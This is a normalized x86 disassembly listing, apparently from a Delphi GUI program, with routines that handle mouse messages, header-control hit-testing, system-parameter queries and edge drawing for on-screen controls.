mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4342c8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_433fcc
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_434004
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44d1c8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_433fcc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4491dc
test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403564
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_4340a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_44a650
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_43334c
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_434108
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44dda0
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4342a3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4489b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403368
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_434286
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_418744
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4188a0
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_43334c
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4188a0
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_4332a4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418790
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_4342c8
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_403564
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_4342e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44845c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_43431c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_456b74
mov eax ebx
call sub_44f7b4
xor edx edx
call sub_42a000
mov edx [ ebx + 0x224 ]
call sub_456bb8
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_421254
mov eax [ ebx + 0x228 ]
call sub_4561e4
push eax
mov eax ebx
call sub_44f7b4
pop edx
call sub_42a000
jmp r-xdata
mov eax ebx
call sub_433b70
pop esi
pop ebx
retn
sub_434390
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4561e4
push eax
mov eax ebx
call sub_44f7b4
pop edx
call sub_42a000
mov eax ebx
call sub_433b70
pop esi
pop ebx
retn
sub_4343b8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_434408
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434527
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_434504
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4195c8
push eax
mov eax esi
call sub_419298
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405440
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419628
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43450b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_43334c
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_4344d9
inc eax
cld
call sub_44f7b4
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43450b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_434534
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43334c
pop edx
call sub_434408
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403564
pop esi
pop ecx
pop ebp
retn
sub_4345b0
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_434620
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4509dc
call sub_43aed8
cmp [ eax + 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x17
mov eax esi
call sub_448748
mov edx 0x16
mov eax esi
call sub_44876c
mov [ esi + 0x16c ] 0xffffffff
mov [ esi + 0x17d ] 0x0
mov eax esi
test bl bl
je r-xdata
sub_4346a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
cmp [ esi + 0x17d ] 0x2
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44a594
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov dl [ esi + 0x16a ]
xor dl 0x1
mov eax esi
call sub_434f10
sub_4346f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44a84c
cmp [ ebx + 0x17d ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_4491dc
test al al
je r-xdata
test esi esi
jl r-xdata
xor edx edx
jmp r-xdata
mov eax ebx
call sub_4489b8
cmp esi eax
jge r-xdata
mov eax ebx
call sub_434f10
test edi edi
jl r-xdata
mov eax ebx
call sub_4489fc
cmp edi eax
jle r-xdata
mov dl 0x1
sub_43475c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44a8f4
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
test esi esi
jl r-xdata
mov eax ebx
call sub_4489b8
cmp esi eax
jge r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_4489fc
cmp edi eax
jg r-xdata
cmp [ ebx + 0x17d ] 0x2
jne r-xdata
xor edx edx
mov eax ebx
call sub_434f10
sub_4347c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_44845c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x178 ]
jne r-xdata
cmp edi [ esi + 0x174 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_434f70
jmp r-xdata
xor edx edx
mov eax esi
call sub_43509c
sub_43480c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x9c ]
test [ esi + 0x1c ] 0x1
jne r-xdata
pop esi
retn
cmp [ esi + 0x184 ] 0x0
je r-xdata
mov eax [ esi + 0x184 ]
cmp [ eax + 0x227 ] 0x0
je r-xdata
mov eax [ esi + 0x184 ]
xor edx edx
mov [ eax + 0x210 ] edx
xor edx edx
mov [ eax + 0x214 ] edx
call sub_436c1c
sub_43485c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x44 ]
jne r-xdata
push esi
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_448548
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
cmp edi [ ebx + 0x4c ]
je r-xdata
mov eax ebx
call sub_435204
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x184 ]
call sub_436fd4
cmp eax [ ebp - 0xc ]
setne [ ebp - 0xd ]
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov al [ ebx + 0x17d ]
add al 0xfd
sub al 0x2
jae r-xdata
mov [ ebp - 0xe ] 0x0
mov eax ebx
call sub_435204
cmp eax [ ebp - 0xc ]
jge r-xdata
xor eax eax
jmp r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
cmp [ ebx + 0x17d ] 0x2
jne r-xdata
mov eax ebx
call sub_435204
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xe ] al
mov al [ ebp - 0xe ]
mov [ ebp - 0xd ] al
mov al 0x1
mov al [ ebx + 0x17d ]
add al 0xfd
sub al 0x2
jb r-xdata
call sub_432ff0
cmp eax 0x40047
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x184 ]
cmp esi [ eax + 0x210 ]
jne r-xdata
mov eax [ ebx + 0x184 ]
add esi [ eax + 0x210 ]
sub esi [ ebx + 0x48 ]
mov eax [ ebx + 0x184 ]
cmp [ eax + 0x229 ] 0x0
jne r-xdata
mov [ ebp - 0xf ] al
mov eax [ ebx + 0x184 ]
cmp edi [ eax + 0x214 ]
setne [ ebp - 0x10 ]
cmp [ ebp - 0xe ] 0x0
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x10
je r-xdata
push esi
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_448548
cmp [ ebp - 0xd ] 0x0
je r-xdata
cmp [ ebp - 0xf ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x184 ]
call sub_435960
jmp r-xdata
cmp [ ebp - 0xf ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x184 ]
call sub_435c14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx edi
mov eax [ ebx + 0x184 ]
call sub_435be4
cmp [ ebp - 0xe ] 0x0
je r-xdata
mov eax [ ebx + 0x184 ]
call sub_436e3c
xor edx edx
mov eax [ ebx + 0x184 ]
call sub_435a94
jmp r-xdata
mov al [ ebx + 0x17d ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x184 ]
call sub_43626c
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x184 ]
call sub_436164
jmp r-xdata
sub_434aa9
add [ eax ] eax
add [ eax ] al
jne r-xdata
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov edi [ ebx + 0x48 ]
mov eax edi
sub eax 0xe
inc eax
mov ecx edi
or edx 0xffffffff
call sub_4062fc
push 0xe
push 0xa
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_42516c
push eax
call DrawEdge
push 0x1
push 0x6
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_42516c
push eax
call DrawEdge
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov edi [ ebx + 0x48 ]
mov eax edi
sub eax 0xe
mov ecx edi
mov edx 0x1
call sub_4062fc
push 0xe
push 0x1
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_42516c
push eax
call DrawEdge
xor eax eax
mov [ esp + 0x4 ] eax
push 0x1
push 0x6
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_42516c
push eax
call DrawEdge
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov edi [ ebx + 0x48 ]
mov eax edi
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x17d ] 0x4
jne r-xdata
add esp 0x1c
pop edi
pop esi
pop ebx
retn
mov al [ ebx + 0x17d ]
add al 0xfd
sub al 0x2
jae r-xdata
dec eax
mov ecx edi
xor edx edx
call sub_4062fc
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
adc eax 0x0
mov eax [ ebx + 0x184 ]
cmp [ eax + 0x229 ] 0x0
jne r-xdata
mov esi [ ebx + 0x160 ]
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_4247a0
mov dl 0xe
mov eax [ esi + 0x10 ]
call sub_424784
mov edx 0xffd8ce
mov eax [ esi + 0x10 ]
call sub_4246c4
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424ac0
mov eax ebx
call sub_4489b8
push eax
mov eax ebx
call sub_4489fc
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_424e4c
jmp r-xdata
push 0x1
push 0x6
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_42516c
push eax
call DrawEdge
call sub_43aed8
lea ecx [ esp + 0x10 ]
mov dl 0x1a
call sub_43b244
push esp
push 0x0
mov eax esi
call sub_42516c
push eax
call sub_43aed8
lea ecx [ esp + 0x1c ]
pop edx
call sub_43b074
jmp r-xdata
cmp [ ebx + 0x16a ] 0x0
jne r-xdata
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4062fc
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
push 0xf
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_42516c
push eax
call DrawEdge
call sub_43aed8
lea ecx [ esp + 0x10 ]
mov dl 0x3
call sub_43b244
push esp
push 0x4
push 0xf
push 0x0
mov eax [ ebx + 0x160 ]
call sub_42516c
push eax
call sub_43aed8
lea ecx [ esp + 0x24 ]
pop edx
call sub_43b028
jmp r-xdata
sub_434ccc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
cmp [ esi + 0x16a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x17d ] 0x1
jne r-xdata
cmp [ esi + 0x57 ] 0x0
jne r-xdata
mov edi [ esi + 0x184 ]
test edi edi
je r-xdata
or bl [ rw-data ]
or bl [ rw-data ]
jmp r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or bl [ rw-data ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
or bl [ rw-data ]
or bl [ rw-data ]
cmp [ esi + 0x171 ] 0x0
je r-xdata
or bl [ rw-data ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
or bl [ rw-data ]
sub_434db8
push ebx
push esi
mov ebx edx
mov esi eax
test bl 0x3
setne al
mov [ esi + 0x16a ] al
test bl 0x4
setne dl
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x16a ] 0x0
jne r-xdata
test bl 0x8
sete dl
mov eax esi
call sub_448ed4
xor eax eax
jmp r-xdata
test bl 0x10
jne r-xdata
mov [ esi + 0x170 ] al
test bl 0x20
setne al
mov [ esi + 0x17c ] al
test bl 0x80
setne al
mov [ esi + 0x171 ] al
pop esi
pop ebx
retn
mov al 0x1
sub_434e20
push ebx
push esi
add esp 0xffffffec
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
add esp 0x14
pop esi
pop ebx
retn
cmp [ ebx + 0x184 ] 0x0
je r-xdata
mov eax [ ebx + 0x184 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
mov eax ebx
call sub_435204
mov edx eax
mov eax [ ebx + 0x184 ]
call sub_435a94
mov esi eax
mov eax esp
push eax
mov eax ebx
call sub_435204
mov ecx eax
mov edx 0x417
mov eax esi
call sub_44a180
test eax eax
je r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov al [ ebx + 0x57 ]
xor al 0x1
and eax 0x7f
xor edx edx
call sub_406de0
push eax
mov ecx [ esp + 0x8 ]
mov edx 0x404
mov eax esi
call sub_44a180
mov eax esi
mov si 0xffee
call sub_403564
sub_434eb8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x184 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
push eax
mov eax ebx
call sub_435204
mov ecx eax
mov edx 0x401
mov eax esi
call sub_44a180
sub_434f10
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x16a ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x16a ] bl
mov edi [ esi + 0x184 ]
test edi edi
je r-xdata
xor eax eax
mov al bl
xor edx edx
call sub_406de0
push eax
mov eax esi
call sub_435204
mov ecx eax
cmp [ esi + 0x17d ] 0x1
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax edi
call sub_44a180
mov eax [ esi + 0x184 ]
call sub_4364cc
sub_434fac
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x16c ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x16c ] esi
cmp [ ebx + 0x184 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
push esi
mov eax ebx
call sub_435204
mov ecx eax
mov edx 0x42b
mov eax [ ebx + 0x184 ]
call sub_44a180
mov eax [ ebx + 0x184 ]
cmp [ eax + 0x22a ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
sub_435010
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x171 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x171 ] bl
mov edi [ esi + 0x184 ]
test edi edi
je r-xdata
xor eax eax
mov al bl
push eax
mov eax esi
call sub_435204
mov ecx eax
mov edx 0x406
mov eax edi
call sub_44a180
sub_435050
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x170 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x170 ] bl
mov edi [ esi + 0x184 ]
test edi edi
je r-xdata
xor edx edx
mov eax esi
call sub_434f10
xor eax eax
mov al bl
push eax
mov eax esi
call sub_435204
mov ecx eax
mov edx 0x405
mov eax edi
call sub_44a180
sub_43509c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x174 ] esi
pop esi
pop ebx
retn
cmp esi [ ebx + 0x174 ]
je r-xdata
mov eax esi
call sub_45ad9c
mov edx eax
mov eax ebx
call sub_448300
mov edx [ esi + 0x30 ]
mov eax ebx
call sub_448fe4
mov dl [ esi + 0x38 ]
mov eax ebx
call sub_434f10
mov dl [ esi + 0x39 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
lea eax [ ebx + 0x80 ]
mov edx [ esi + 0x58 ]
call sub_4041b8
mov edx [ esi + 0x40 ]
mov eax ebx
call sub_434fac
mov dl [ esi + 0x3e ]
mov eax ebx
call sub_448ed4
mov edx ebx
mov eax esi
call sub_421254
sub_435110
push esi
mov esi eax
cmp dl [ esi + 0x17d ]
je r-xdata
pop esi
retn
mov [ esi + 0x17d ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test [ esi + 0x1c ] 0x1
jne r-xdata
cmp [ esi + 0x184 ] 0x0
je r-xdata
mov eax [ esi + 0x184 ]
cmp [ eax + 0x227 ] 0x0
je r-xdata
mov dl [ esi + 0x17d ]
mov ecx edx
add cl 0xfd
sub cl 0x2
jae r-xdata
xor edx edx
mov [ eax + 0x210 ] edx
xor edx edx
mov [ eax + 0x214 ] edx
call sub_436c1c
jmp r-xdata
cmp dl 0x2
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
jmp r-xdata
mov eax [ esi + 0x184 ]
mov si 0xffee
call sub_403564
mov eax esi
mov edx [ eax ]
call [ edx + 0x9c ]
call sub_436c1c
jmp r-xdata
mov eax [ esi + 0x184 ]
call sub_436e3c
mov eax esi
call sub_435204
mov edx eax
mov eax [ esi + 0x184 ]
call sub_435a94
sub_435230
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x184 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_435204
mov edx eax
mov eax esi
call sub_436164
test al al
sub_435254
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x184 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_435204
